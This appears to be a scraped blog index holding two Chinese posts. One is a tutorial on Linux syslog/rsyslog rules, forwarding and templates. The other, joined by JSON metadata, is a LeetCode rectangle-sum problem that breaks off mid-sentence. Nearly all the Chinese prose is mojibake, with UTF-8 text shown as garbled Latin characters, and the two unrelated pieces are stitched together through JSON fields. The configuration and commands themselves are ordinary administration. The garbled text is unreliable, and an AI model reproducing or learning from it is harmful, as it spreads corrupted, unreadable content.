ä¸ç®¡æ˜¯ä»€ä¹ˆåº”ç”¨ï¼Œæ—¥å¿—æœºåˆ¶æ°¸æ˜¯æœ€é‡è¦çš„æœºåˆ¶ä¹‹ä¸€ï¼Œä»æ—¥å¿—ä¸­ï¼Œç»´æŠ¤äººå‘˜å¯ä»¥æ’æŸ¥é”™è¯¯ã€å‘ç°æ”»å‡»ï¼Œä»è€Œæœ‰æ•ˆåœ°æé«˜åº”ç”¨çš„å¯ç”¨æ€§ã€‚\næ“ä½œç³»ç»Ÿä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæœ¬æ–‡å°†å¯¹Linuxæ—¥å¿—æœºåˆ¶ä¸­çš„ä¸€ä¸ªé‡è¦ç»„æˆéƒ¨åˆ†â€”â€”syslog/rsyslogâ€”â€”è¿›è¡Œä¸€ä¸ªç®€è¦çš„å™è¿°ã€‚\nå¤§éƒ¨åˆ†Linuxå‘è¡Œç‰ˆé»˜è®¤çš„æ—¥å¿—å®ˆæŠ¤è¿›ç¨‹ä¸ºsyslogï¼ˆæˆ–è¾ƒæ–°ç‰ˆæœ¬çš„rsyslogï¼‰ï¼Œä½äº /etc/syslog æˆ– /etc/syslogd æˆ– /etc/rsyslog.d ï¼Œé»˜è®¤é…ç½®æ–‡ä»¶ä¸º /etc/syslog.conf æˆ– rsyslog.conf ï¼Œä»»ä½•å¸Œæœ›ç”Ÿæˆæ—¥å¿—çš„ç¨‹åºéƒ½å¯ä»¥å‘syslogå‘é€ä¿¡æ¯ã€‚\nsyslogåº”è¯¥å¯¹æ¥æ”¶çš„ä¿¡æ¯è¿›è¡ŒæŸç§å¤„ç†ã€‚æˆ‘ä»¬å¯ä»¥ä»ç›´è§‰å‡ºå‘ï¼Œè€ƒè™‘ä¸€ä¸‹syslogæ”¶åˆ°ä¸€æ¡ä¿¡æ¯ååº”è¯¥åšå“ªäº›äº‹æƒ…ï¼šé¦–å…ˆï¼Œç³»ç»Ÿä¸­æœ‰é‚£ä¹ˆå¤šçš„ä¿¡æ¯æºï¼Œæˆ‘ä»¬ä¼šè€ƒè™‘å¯¹è¿™äº›ä¿¡æ¯æºè¿›è¡Œåˆ†ç±»ï¼›ä¹‹åï¼Œæ¯ä¸ªä¿¡æ¯æºç»™å‡ºçš„ä¿¡æ¯éƒ½å…·æœ‰ä¸åŒçš„æƒ…å¢ƒï¼Œæ­£å¸¸è¿è¡Œäº§ç”Ÿçš„ä¿¡æ¯è·ŸæŠ¥é”™ä¿¡æ¯è‚¯å®šä¸èƒ½ä¸€è§†åŒä»çš„ï¼Œæˆ‘ä»¬ä¼šè€ƒè™‘æ ¹æ®ä¿¡æ¯çš„ä¸¥é‡æ€§å¯¹è¿™äº›ä¿¡æ¯è¿›è¡Œåˆ†ç±»ï¼›æœ€åï¼Œç¬¦åˆç­›é€‰æ¡ä»¶çš„ä¿¡æ¯å°±è§¦å‘æŸç§åŠ¨ä½œï¼Œæ¯”å¦‚æŠŠå®ƒå†™è¿›æŸä¸ªæ—¥å¿—æ–‡ä»¶é‡Œã€‚\næµç¨‹å›¾æ˜¯ä¸ªå¥½ä¸œè¥¿ã€‚æˆ‘ä»¬å‡è®¾ç³»ç»Ÿä¸­æœ‰è‹¥å¹²ç±»ä¿¡æ¯æºï¼Œæ¯ç±»ä¿¡æ¯æºäº§ç”Ÿä¸åŒç­‰çº§çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆsyslogåº”è¯¥å¯¹è¿™äº›ä¿¡æ¯è¿›è¡Œåˆ†ç±»åˆ†çº§å¤„ç†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nsyslogå¤„ç†åˆ†ç±»åˆ†çº§å¤„ç†ä¿¡æ¯ å½“ç„¶ï¼Œè¿™ä¸€æµç¨‹å›¾åªæ˜¯ä¸ºäº†è¾ƒä¸ºç›´è§‚åœ°å‘ˆç°syslogåˆ†ç±»åˆ†çº§çš„æœºåˆ¶ï¼Œä»¥ä½¿è¯»è€…æœ‰ä¸ªåˆæ­¥çš„å°è±¡ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ä»é…ç½®æ–‡ä»¶å‡ºå‘ï¼Œä»‹ç»syslogï¼ˆrsyslogï¼‰çš„æ—¥å¿—è®°å½•ç»†èŠ‚ã€‚\nè¿‡æ»¤è§„åˆ™ å¦‚æœä½ çš„ç³»ç»Ÿæ˜¯CentOSï¼Œå¯ä»¥æ‰“å¼€ /etc/rsyslog.conf ï¼Œè¿™æ˜¯syslogçš„é…ç½®æ–‡ä»¶ï¼ŒUbuntuä¸‹çš„é…ç½®æ–‡ä»¶ä½äº /etc/rsyslog.d/50-default.conf ï¼›åœ¨è¿™é‡Œï¼Œä½ å¯ä»¥çœ‹åˆ°ä¸å°‘ç±»ä¼¼ä¸‹æ–¹çš„è¯­å¥ï¼š\nauthpriv.* /var/log/secure\nè¿™æ˜¯syslogæ—¥å¿—è®°å½•çš„ä¸€æ¡è§„åˆ™ï¼Œæˆ‘ä»¬å°†è§„åˆ™æ‹†å¼€æ¥çœ‹ï¼Œå®é™…ä¸Šåªæœ‰ä¸‰ä¸ªéƒ¨åˆ†ï¼š\nè§„åˆ™çš„ç»„æˆ ç¬¬ä¸€ä¸ªéƒ¨åˆ†æ˜¯facilityï¼ˆè®¾å¤‡ç±»å‹ï¼‰ï¼Œç¬¬äºŒä¸ªéƒ¨åˆ†æ˜¯priorityï¼ˆä¼˜å…ˆçº§/ä¸¥é‡æ€§ï¼‰ï¼Œç¬¬ä¸‰ä¸ªéƒ¨åˆ†æ˜¯actionï¼ˆåŠ¨ä½œï¼‰ã€‚\nä½ åº”è¯¥èƒ½å¤Ÿæƒ³åˆ°ï¼Œè¿™ä¸€æ¡è§„åˆ™å°±æè¿°äº†ä¸Šæ–‡æ‰€è¯´çš„å¯¹æ¶ˆæ¯è¿›è¡Œåˆ†ç±»åˆ†çº§å¤„ç†çš„è¿‡ç¨‹ï¼\nä»”ç»†çœ‹çœ‹é…ç½®æ–‡ä»¶å§ï¼Œæ¯ä¸€æ¡è§„åˆ™éƒ½æ˜¯å¦‚æ­¤çš„ç®€å•è€Œå®ç”¨ï¼š\n#### RULES #### # Log all kernel messages to the console. # Logging much else clutters up the screen. #kern.* /dev/console # Log anything (except mail) of level info or higher. # Don\u0026#39;t log private authentication messages! *.info;mail.none;authpriv.none;cron.none /var/log/messages # The authpriv file has restricted access. authpriv.* /var/log/secure # Log all the mail messages in one place. mail.* -/var/log/maillog # Log cron stuff cron.* /var/log/cron # Everybody gets emergency messages *.emerg :omusrmsg:* facility è§„åˆ™çš„ç¬¬ä¸€éƒ¨åˆ†facilityæŒ‡çš„æ˜¯æ¶ˆæ¯æºè®¾å¤‡çš„ç±»å‹ã€‚syslogä½“ç³»ä¸­å·²ç»å°†Linuxä¸­çš„å¤§éƒ¨åˆ†è¿›ç¨‹è¿›è¡Œäº†åˆç†çš„åˆ†ç±»ï¼Œä¾‹å¦‚ä¸å†…æ ¸æ¶ˆæ¯ç›¸å…³çš„ kern ç±»å‹ã€ä¸æˆæƒä¿¡æ¯ç›¸å…³çš„ auth/authpriv ç±»å‹ç­‰ç­‰ï¼Œå®˜æ–¹ä¸ºæˆ‘ä»¬æ€»ç»“å‡ºäº†å¦‚ä¸‹çš„è¡¨æ ¼ï¼š\nfacilities priorityå’Œselector å°†æ¶ˆæ¯æºè®¾å¤‡è¿›è¡Œåˆ†ç±»ä¹‹åï¼Œå°±éœ€è¦çœ‹çœ‹è¿™æ¡æ¶ˆæ¯å¯¹åº”çš„æ˜¯ä»€ä¹ˆçº§åˆ«ï¼Œpriorityï¼ˆæˆ–è€…å«severityï¼‰å°±ç”¨æ¥è¡¨ç¤ºæ¶ˆæ¯çš„ä¸¥é‡æ€§ã€‚\nSeverities facility + priorityçš„å½¢å¼èƒ½å¤Ÿå”¯ä¸€ç¡®å®šä¸€æ¡æ¶ˆæ¯çš„ç§ç±»ï¼Œå› æ­¤è¢«ç§°ä¸º é€‰æ‹©å™¨ï¼ˆselectorï¼‰ ã€‚æ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„è§„åˆ™é‚£æ ·ï¼Œä½¿ç”¨ facility.priority çš„å½¢å¼æ¥æŒ‡å®šä¸€ä¸ªé€‰æ‹©å™¨ã€‚å…¶ä¸­ï¼Œåœ¨ä¸ç‰¹åˆ«æŒ‡å®šçš„æƒ…å†µä¸‹ï¼Œé€‰ä¸­çš„æ˜¯ facility è®¾å¤‡ç±»å‹æ‰€äº§ç”Ÿçš„ priority çº§åˆ«åŠä»¥ä¸Šçš„æ¶ˆæ¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ª kern.info é€‰æ‹©å™¨ä¸ä»…èƒ½é€‰ä¸­ kern ç±»å‹çš„ info çº§åˆ«æ¶ˆæ¯ï¼Œè¿˜èƒ½é€‰ä¸­ info ä»¥ä¸Šçš„æ‰€æœ‰çº§åˆ«ã€‚\nä¾‹å¦‚ kernel è¿›ç¨‹äº§ç”Ÿäº†ä¸€æ¡ä¸¥é‡æ€§ä¸º warning çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆè¿™æ¡ä¿¡æ¯å°±å°†è¢« kern.info æˆ– kern.notice ç­‰è§„åˆ™é€‰ä¸­ã€‚\né™¤äº†åŸºæœ¬çš„é€‰æ‹©å™¨ç”¨æ³•ï¼Œrsyslogåœ¨syslogçš„åŸºç¡€ä¸Šæ‰©å±•äº†ä¸€äº›é€‰æ‹©å™¨çš„è¯­æ³•ã€‚ä¾‹å¦‚ä½¿ç”¨ç¬¦å· = å¯ä»¥ ä¸¥æ ¼é€‰ä¸­ æŸä¸€ä¼˜å…ˆçº§çš„æ¶ˆæ¯ï¼Œä½¿ç”¨ç¬¦å· ! å¯ä»¥é€‰ä¸­ é™¤äº† æŸä¸€ä¼˜å…ˆçº§çš„æ‰€æœ‰æ¶ˆæ¯ï¼Œæœ€å¸¸ç”¨çš„ * å·è¡¨ç¤ºè¿™ä¸€å­—æ®µçš„ æ‰€æœ‰å–å€¼ ï¼Œå­—æ®µ none å¸¸å¸¸é…åˆ * å·ä½¿ç”¨ï¼Œè¡¨ç¤ºä¸è®°å½•æŸäº›facilityçš„æ¶ˆæ¯ã€‚è¿˜æœ‰ä¸€äº›ä½¿ç”¨è¡¨è¾¾å¼æ„é€ çš„é€‰æ‹©å™¨ï¼Œåœ¨æ­¤ä¸åŠ å™è¿°ï¼ˆå› ä¸ºåœ¨Linuxé»˜è®¤é…ç½®ä¸­æœ¬èº«å°±ç”¨å¾—ä¸å¤šï¼‰ï¼Œè¯»è€…å¯ä»¥é˜…è¯»æ–‡æœ«ç»™å‡ºçš„å‚è€ƒèµ„æ–™[1]æ¥è¿›è¡Œæ‰©å±•å­¦ä¹ ã€‚\naction æœ€åï¼Œæ˜¯è§„åˆ™çš„æœ€åä¸€éƒ¨åˆ†â€”â€”åŠ¨ä½œï¼ˆactionï¼‰ã€‚è¿™ä¸€éƒ¨åˆ†çš„å†…å®¹å¯ä»¥æœ‰è¾ƒå¤šçš„ç©æ³•ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸¤ç§æ“ä½œï¼š\nactionå­—æ®µå†™ä¸Šä¸€ä¸ªæ–‡ä»¶åã€‚å¦‚é»˜è®¤é…ç½®æ–‡ä»¶ä¸­çš„å¤šæ•°è§„åˆ™ï¼Œè¿™è¡¨ç¤ºå°†é€‰æ‹©å™¨é€‰ä¸­çš„æ¶ˆæ¯è®°å½•åˆ°ç›®æ ‡æ–‡ä»¶ä¸Šã€‚ actionå­—æ®µå½¢å¦‚ @\u0026lt;IP\u0026gt;:\u0026lt;ç«¯å£\u0026gt; ï¼Œè¿™è¡¨ç¤ºå°†é€‰æ‹©å™¨é€‰ä¸­çš„æ¶ˆæ¯ è½¬å‘ åˆ°ç›®æ ‡æœåŠ¡å™¨çš„ç›®æ ‡ç«¯å£ä¸Šã€‚ä¸€ä¸ª @ å·è¡¨ç¤ºä½¿ç”¨UDPåè®®å‘é€ï¼ˆé»˜è®¤ï¼‰ï¼Œä¸¤ä¸ª @ å·è¡¨ç¤ºä½¿ç”¨TCPåè®®å‘é€ã€‚ä¾‹å¦‚æˆ‘ä»¬é…ç½®ä¸€æ¡è§„åˆ™ *.* @@192.168.0.1:514 è¡¨ç¤ºå°†æ‰€æœ‰ç±»å‹çš„ã€æ‰€æœ‰çº§åˆ«çš„æ¶ˆæ¯éƒ½è½¬å‘åˆ°æœåŠ¡å™¨ 192.168.0.1 çš„ 514 ç«¯å£ã€‚ è‡³æ­¤ï¼Œæˆ‘ä»¬å°±äº†è§£äº†è§„åˆ™çš„å«ä¹‰ï¼Œé¡ºå¸¦åœ°ï¼Œä½ å¯ä»¥åˆæ­¥è¯»æ‡‚Linuxæ—¥å¿—é…ç½®æ–‡ä»¶é‡Œçš„éƒ¨åˆ†å†…å®¹äº†ã€‚ä»è¿™äº›è§„åˆ™å‡ºå‘ï¼Œä½ èƒ½å¤Ÿå¯¹Linuxç³»ç»Ÿä¸‹çš„ä¸€äº›æ—¥å¿—æ–‡ä»¶æœ‰æ›´æ·±å…¥çš„äº†è§£ã€‚æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹è¿™äº›è§„åˆ™ï¼š\n*.info;mail.none;authpriv.none;cron.none /var/log/messages # è¿™æ¡è§„åˆ™è¡¨ç¤ºå°†é™¤äº† mailã€authprivã€cron çš„ç±»å‹ä¹‹å¤–çš„æ‰€æœ‰è®¾å¤‡ç±»å‹çš„æ¶ˆæ¯è®°å½•åˆ° /var/log/messages æ–‡ä»¶ä¸­ # å› æ­¤ï¼Œä½ å¯ä»¥åœ¨ /var/log/message æ–‡ä»¶ä¸­æ‰¾åˆ°å¤§éƒ¨åˆ†æ—¥å¿—æ¶ˆæ¯ authpriv.* /var/log/secure # è¿™æ¡è§„åˆ™è¡¨ç¤ºå°† authpriv ç±»å‹çš„æ‰€æœ‰çº§åˆ«æ¶ˆæ¯è®°å½•åˆ° /var/log/secure æ–‡ä»¶ä¸­ # å› æ­¤ï¼Œä½ åº”è¯¥åœ¨ /var/log/secure æ–‡ä»¶ä¸­æŸ¥çœ‹ä¸æˆæƒä¿¡æ¯ç›¸å…³çš„æ—¥å¿—ï¼ˆå¦‚sshdç™»å½•è®°å½•ï¼Œsudoè®¤è¯è®°å½•ç­‰ï¼‰ mail.* -/var/log/maillog cron.* /var/log/cron å¯ä»¥çœ‹åˆ°ï¼Œä¸Šé¢ä¸‰æ¡è§„åˆ™çš„facilityæ˜¯äº’è¡¥çš„ï¼ŒæŠŠè¿™å‡ ä¸ªæ–‡ä»¶ç»¼åˆèµ·æ¥çœ‹ï¼Œç›¸å½“äºä½¿ç”¨äº† *.* çš„é€‰æ‹©å™¨ï¼ˆinfo çº§åˆ«å·²ç»å’Œ * å·®ä¸å¤šäº†ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ åŸºæœ¬å¯ä»¥åœ¨ä¸Šé¢çš„å››ä¸ªæ–‡ä»¶ä¸­æŸ¥çœ‹åˆ°Linuxç³»ç»Ÿäº§ç”Ÿçš„æ‰€æœ‰æ¶ˆæ¯ã€‚\næ¨¡æ¿Template é˜…è¯»è‡³æ­¤ï¼Œæˆ‘ä»¬èƒ½å¤ŸæŠŠä»»ä½•éœ€è¦çš„æ¶ˆæ¯ç”¨æˆ‘ä»¬å¸Œæœ›çš„åŠæ³•è¿›è¡Œè®°å½•æˆ–è½¬å‘ï¼Œä½†ä»…ä»…é‡‡ç”¨é»˜è®¤çš„æ ¼å¼å¯èƒ½è¿˜è¿œè¿œä¸å¤Ÿã€‚\næ­£å¸¸æƒ…å†µä¸‹ï¼Œä¸€æ¡Linuxæ—¥å¿—é•¿æˆè¿™æ ·ï¼š\nJul 2 23:30:03 localhost su: pam_unix(su:session): session opened for user root by xr_g(uid=0) è¿™ä¸€æ¡æ—¥å¿—åˆ†ä¸ºå‡ ä¸ªéƒ¨åˆ†ï¼š [æ—¶é—´æˆ³] [ä¸»æœºå] [è¿›ç¨‹åå’Œè¿›ç¨‹ID] [æ¶ˆæ¯ä½“] ã€‚\nè¿™å¯ä¸æ˜¯æˆ‘çè¯´çš„ï¼Œå› ä¸ºrsyslogåœ¨è®°å½•æ—¥å¿—çš„æ—¶å€™ä½¿ç”¨äº†é»˜è®¤çš„ æ¨¡æ¿ ã€‚\nå¦‚æœä½ ä½¿ç”¨è¿‡Djangoæˆ–è€…ä»€ä¹ˆå…¶ä»–çš„åç«¯ç¼–ç¨‹æ¡†æ¶ï¼Œå¾ˆå¯èƒ½å·²ç»äº†è§£äº†æ¨¡æ¿çš„æ¦‚å¿µï¼›å¦‚æœä½ æ²¡æ¥è§¦è¿‡æ¨¡æ¿ï¼Œä¸å¦¨ç®€å•åœ°å°†å…¶çœ‹ä½œä¸€ç§ æ ¼å¼ ï¼Œå°±åƒä½ å†™è®ºæ–‡æ—¶å€™çš„æ ¼å¼è¦æ±‚é‚£æ ·ï¼Œæ‰€æœ‰çš„æ¶ˆæ¯éƒ½è¦æŒ‰ç…§è¿™ç§æ ¼å¼è¿›è¡Œè®°å½•ã€‚è€Œä¸ä½ å†™è®ºæ–‡æ—¶ç›¸åŒï¼Œè®ºæ–‡æ¨¡æ¿é‡Œæ€»æ˜¯ä¼šæŒ‡å®šä¸€äº›è¾ƒä¸ºå®½æ³›çš„ å±æ€§ ï¼Œæ¯”å¦‚å¼€å¤´è¦å†™ä¸Šæ‘˜è¦å’Œå…³é”®å­—ï¼Œæ‰€æœ‰äººçš„è®ºæ–‡éƒ½æ˜¯ç›¸åŒçš„ç»“æ„ï¼Œä½†æ‘˜è¦å’Œå…³é”®å­—çš„å…·ä½“å†…å®¹å°±å› äººè€Œå¼‚äº†ã€‚\næ—¥å¿—çš„æ¨¡æ¿ä¹Ÿæ­£æ˜¯å¦‚æ­¤ï¼Œä¸€æ¡æ¨¡æ¿æŒ‡å®šäº†æ—¥å¿—çš„å¤§è‡´ç»“æ„ï¼Œå°±åƒä¸Šé¢æåˆ°çš„é‚£æ ·ï¼›è€Œè¿™ä¸€ç»“æ„ç”±ä¸€ä¸ªä¸€ä¸ªçš„å±æ€§ç»„æˆï¼Œæ—¥å¿—å®ˆæŠ¤è¿›ç¨‹éœ€è¦æ ¹æ®è¿™äº›å±æ€§å¾€æ¨¡æ¿é‡Œå¡«å……æ•°æ®ï¼Œä»è€Œäº§ç”Ÿä¸€æ¡å…·ä½“çš„æ—¥å¿—ã€‚\næ¨¡æ¿çš„å®šä¹‰ æ¨¡æ¿çš„å®šä¹‰åŠæ³•æœ‰æ–°æ—§ä¸¤ç§ï¼Œæˆ‘ä¸ªäººæ¯”è¾ƒä¹ æƒ¯æ—§å¼çš„æ¨¡æ¿å®šä¹‰åŠæ³•ï¼š\n# $template [æ¨¡æ¿å] [æ¨¡æ¿æ ¼å¼] $template MyTmp,\u0026#34;%timestamp% %hostname% %syslogfacility-text% %syslogseverity-text% %msg%\\n\u0026#34; è€Œæ–°ç‰ˆçš„æ¨¡æ¿å®šä¹‰åŠæ³•æœ‰è‹¥å¹²ä¸ªï¼Œä¾‹å¦‚ï¼š\ntemplate(name=\u0026#34;tpl3\u0026#34; type=\u0026#34;string\u0026#34; string=\u0026#34;%TIMESTAMP:::date-rfc3339% %HOSTNAME% %syslogtag%%msg:::sp-if-no-1st-sp%%msg:::drop-last-lf%\\n\u0026#34; ) æ¨¡æ¿çš„ä½¿ç”¨ å®šä¹‰å¥½äº†è‡ªå·±çš„æ¨¡æ¿ä¹‹åï¼Œå¯ä»¥ç›´æ¥å°†æ¨¡æ¿åº”ç”¨åœ¨actionå­—æ®µä¸Šï¼Œå…·ä½“åŠæ³•å°±æ˜¯åœ¨actionåŸæœ¬çš„å†…å®¹ååŠ ä¸€ä¸ªåˆ†å· ; ï¼Œç„¶åå†™ä¸Šè‡ªå·±çš„æ¨¡æ¿åã€‚\nä¾‹å¦‚ä¿®æ”¹ /var/log/message å†…å®¹ä¸ºæˆ‘ä»¬è‡ªå®šä¹‰çš„æ ¼å¼ï¼š\n# Step1 è®¾ç½®æ¨¡æ¿ï¼Œä½¿ç”¨æ¨¡æ¿ [root@localhost log]# cat /etc/rsyslog.conf Â·Â·Â· $template MyTmp,\u0026#34;%timestamp% %hostname% %syslogfacility-text% %syslogseverity-text% %msg%\\n\u0026#34; Â·Â·Â· *.info;mail.none;authpriv.none;cron.none /var/log/messages;MyTmp # æ³¨æ„è¿™é‡Œï¼ï¼ï¼ï¼ # Step2 é‡å¯rsyslogæœåŠ¡ [root@localhost log]# systemctl restart rsyslog # Step3 è§‚å¯Ÿæ—¥å¿—å†…å®¹çš„å˜åŒ– [root@localhost log]# tail /var/log/messages Â·Â·Â· Jul 2 23:57:55 localhost daemon info Stopped System Logging Service. Jul 2 23:57:55 localhost daemon info Starting System Logging Service... Â·Â·Â· rsyslogç»™å‡ºäº†ä¸€äº›æ¨¡æ¿ä¸­å¯ç”¨çš„å±æ€§ï¼Œæ­¤å¤„åˆ—å‡ºå‡ ä¸ªå¸¸ç”¨çš„å±æ€§ï¼Œè¯¦ç»†ä¿¡æ¯å¯ä»¥æŸ¥çœ‹å‚è€ƒèµ„æ–™[2]ã€‚\nå±æ€§ å«ä¹‰ %timestamp% æ—¶é—´æˆ³ï¼Œæ ¼å¼ä¸ºé»˜è®¤ä¸º MMM dd HH:mm:ss %syslogtag% æ¶ˆæ¯çš„æ ‡ç­¾ï¼Œä¸€èˆ¬ä¸º è¿›ç¨‹å[è¿›ç¨‹ID] çš„å½¢å¼ï¼Œå¦‚ sshd[1234] %msg% åŸç¨‹åºå‘é€çš„æ¶ˆæ¯å†…å®¹ï¼Œè¿™ä¸€å­—æ®µç”±åŸå§‹è¿›ç¨‹è‡ªè¡Œå®šä¹‰ï¼Œä¸€èˆ¬å„ä¸ç›¸åŒ %fromhost-ip% ä¸€èˆ¬ç”¨äºè¿œç¨‹æ¥æ”¶æ—¥å¿—çš„æœåŠ¡å™¨ä¸Šï¼Œè·å–æ—¥å¿—å‘é€æ–¹çš„IP %syslogfacility-text% ä»¥æ–‡å­—å½¢å¼æ‰“å°å‡ºfacility %syslogseverity-text% ä»¥æ–‡å­—å½¢å¼æ‰“å°å‡ºseverity %hostname% ä¸»æœºå æˆ‘ä»¬éœ€è¦ä¸ºè‡ªå®šä¹‰çš„æ¨¡æ¿å‘½åï¼Œå½“ç„¶ï¼Œä¸èƒ½ä¸ç³»ç»Ÿé»˜è®¤ä¿ç•™çš„ä¸€äº›æ¨¡æ¿é‡åï¼Œæ¯”å¦‚ä¸‹é¢å‡ ä¸ªç³»ç»Ÿè‡ªå¸¦çš„æ¨¡æ¿ï¼š\ntemplate(name=\u0026#34;RSYSLOG_TraditionalForwardFormat\u0026#34; type=\u0026#34;string\u0026#34; string=\u0026#34;\u0026lt;%PRI%\u0026gt;%TIMESTAMP% %HOSTNAME% %syslogtag:1:32%%msg:::sp-if-no-1st-sp%%msg%\u0026#34;) template(name=\u0026#34;RSYSLOG_ForwardFormat\u0026#34; type=\u0026#34;string\u0026#34; string=\u0026#34;\u0026lt;%PRI%\u0026gt;%TIMESTAMP:::date-rfc3339% %HOSTNAME% %syslogtag:1:32%%msg:::sp-if-no-1st-sp%%msg%\u0026#34;) æ›´å¤šçš„å†…å®¹å¯ä»¥é˜…è¯»å‚è€ƒèµ„æ–™[3]ã€‚\næ³¨æ„ä¸Šé¢ç»™å‡ºçš„ç¬¬ä¸€ä¸ªç³»ç»Ÿæ¨¡æ¿ RSYSLOG_TraditionalForwardFormat ï¼Œè¿™æ­£æ˜¯Linuxç³»ç»Ÿä¸­é»˜è®¤çš„æ—¥å¿—æ ¼å¼ï¼Œç°åœ¨ä½ æ˜ç™½å‰é¢æˆ‘ä»¬å¯¹ç³»ç»Ÿæ—¥å¿—çš„æ ¼å¼è§£é‡Šæ˜¯ä»ä½•è€Œæ¥çš„äº†ã€‚\nå°ç»“ åœ¨å®é™…å·¥ä½œä¸­ï¼Œsyslogè¿˜æœ‰ä¸€äº›å…¶ä»–çš„ç©æ³•ï¼ˆå¦‚é…ç½®è¿œç¨‹è½¬å‘ï¼Œæ—¥å¿—æ¨¡æ¿çš„è¿›é˜¶ä½¿ç”¨ç­‰ï¼‰ï¼Œåœ¨æ­¤å°±ä¸äºˆä»‹ç»äº†ï¼Œä¹‹åæœ‰æ—¶é—´å†å¼€ä¸€ç¯‡ã€‚\næœ¬æ–‡ä»‹ç»äº†Linuxæ—¥å¿—æœºåˆ¶çš„ä¸€ä¸ªé‡è¦ä¾èµ–â€”â€”syslog/rsyslogï¼Œé€šè¿‡å¯¹æ—¥å¿—é…ç½®æ–‡ä»¶ã€è§„åˆ™å«ä¹‰ç­‰çš„ç®€è¦å™è¿°ï¼Œç›¸ä¿¡è¯»è€…èƒ½å¤Ÿå¯¹Linuxæ—¥å¿—çš„æœºåˆ¶æœ‰ä¸€ä¸ªåˆæ­¥çš„ç†è§£ï¼Œé€šè¿‡è¿™äº›æ—¥å¿—ï¼Œä½ å°†èƒ½å¤Ÿæ­å¼€ç³»ç»Ÿè¿è¡ŒçŠ¶æ€çš„é¢çº±ï¼Œæ›´é«˜æ•ˆåœ°æ’é™¤é”™è¯¯ï¼Œæ›´å¿«ä¹åœ°ç”Ÿæ´»ã€‚\nå‚è€ƒèµ„æ–™ [1] Filter Conditions â€” rsyslog 8.18.0.master documentation\n[2] RSyslog Documentation - properties - rsyslog\n[3] RSyslog Documentation - templates - rsyslog\n","date":"2021-07-03T00:00:00Z","permalink":"https://xrg.fj.cn/p/syslog%E6%9C%BA%E5%88%B6%E7%AE%80%E8%BF%B0/","title":"syslogæœºåˆ¶ç®€è¿°"},{"content":"éš¾é¢˜æœ¬ä¸ºæ•°ä¸å¤šçš„Hardé¢˜~\né¢˜ç›® ç»™ä½ ä¸€ä¸ª m x n çš„çŸ©é˜µ matrix å’Œä¸€ä¸ªæ•´æ•° k ï¼Œæ‰¾å‡ºå¹¶è¿”å›çŸ©é˜µå†…éƒ¨çŸ©å½¢åŒºåŸŸçš„ä¸è¶…è¿‡ k çš„æœ€å¤§æ•°å€¼å’Œã€‚\né¢˜ç›®æ•°æ®ä¿è¯æ€»ä¼šå­˜åœ¨ä¸€ä¸ªæ•°å€¼å’Œä¸è¶…è¿‡ k çš„çŸ©å½¢åŒºåŸŸã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š matrix = [[1,0,1],[0,-2,3]], k = 2 è¾“å‡ºï¼š 2 è§£é‡Šï¼š è“è‰²è¾¹æ¡†åœˆå‡ºæ¥çš„çŸ©å½¢åŒºåŸŸ [[0, 1], [-2, 3]] çš„æ•°å€¼å’Œæ˜¯ 2ï¼Œä¸” 2 æ˜¯ä¸è¶…è¿‡ k çš„æœ€å¤§æ•°å­—ï¼ˆk = 2ï¼‰ã€‚ ç¤ºä¾‹2\nè¾“å…¥ï¼š matrix = [[2,2,-1]], k = 3 è¾“å‡ºï¼š 3 æ•°æ®èŒƒå›´\nm == matrix.length n == matrix[i].length 1 \u0026lt;= m, n \u0026lt;= 100 -100 \u0026lt;= matrix[i][j] \u0026lt;= 100 -105 \u0026lt;= k \u0026lt;= 105 åˆ†æ æˆ‘ä»¬è¦å¾—åˆ°æ¯ä¸€ä¸ªå°çŸ©å½¢ï¼Œåˆ™å¯ä»¥ï¼š\néå†ä¸Šä¸‹ç•Œ éå†å·¦å³ç•Œ åªåˆ†æéå†ä¸Šä¸‹ç•Œçš„æƒ…å†µï¼Œå½“æˆ‘ä»¬å¾—åˆ°äº†ä¸€ç»„ç¡®å®šçš„ä¸Šä¸‹ç•Œä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¾ˆå¤šä¸ªçŸ©å½¢åŒºåŸŸï¼š\nä¾‹ï¼šç¡®è®¤ä¸Šä¸‹ç•Œä¹‹åçš„çŸ©å½¢åŒºåŸŸ å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªçŸ©å½¢åŒºåŸŸç”±ç»™å®šçš„ä¸Šä¸‹ç•Œå’Œ å‡ ä¸ªè¿ç»­çš„åˆ— ç»„æˆã€‚\nåœ¨è¿™ä¸ªçŸ©å½¢åŒºåŸŸä¸­ï¼Œæˆ‘ä»¬çš„æ€»å’Œä¸èƒ½è¶…è¿‡ k ã€‚åªè¦æˆ‘ä»¬æ±‚å‡ºæ¯ä¸€åˆ—çš„æ€»å’Œï¼Œåˆ™å¯ä»¥å°†åŸé—®é¢˜è½¬åŒ–ä¸ºï¼š\nç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„å’Œä¸€ä¸ªæ•´æ•° kï¼Œè®¡ç®—è¯¥æ•°ç»„çš„æœ€å¤§åŒºé—´å’Œï¼Œè¦æ±‚åŒºé—´å’Œä¸è¶…è¿‡ kã€‚\né—®é¢˜ä¸€ã€ å¦‚ä½•å¿«é€Ÿæ±‚å‡ºæ¯ä¸€åˆ—çš„æ€»å’Œå‘¢ï¼Ÿ\næˆ‘ä»¬åœ¨æœ€å¤–å±‚éå†ä¸Šè¾¹ç•Œï¼Œå¯¹äºé€’å¢çš„ä¸‹è¾¹ç•Œæ¥è¯´ï¼Œåªéœ€è¦åœ¨ä¸Šä¸€è½®çš„ç»“æœä¸­åŠ ä¸Šå½“å‰è¿™ä¸€è¡Œçš„å…ƒç´ ï¼Œå³å¯å¾—åˆ°æ¯ä¸€åˆ—çš„æ€»å’Œã€‚\né—®é¢˜äºŒã€ å¦‚ä½•å¿«é€Ÿæ±‚å‡ºä¸è¶…è¿‡ k 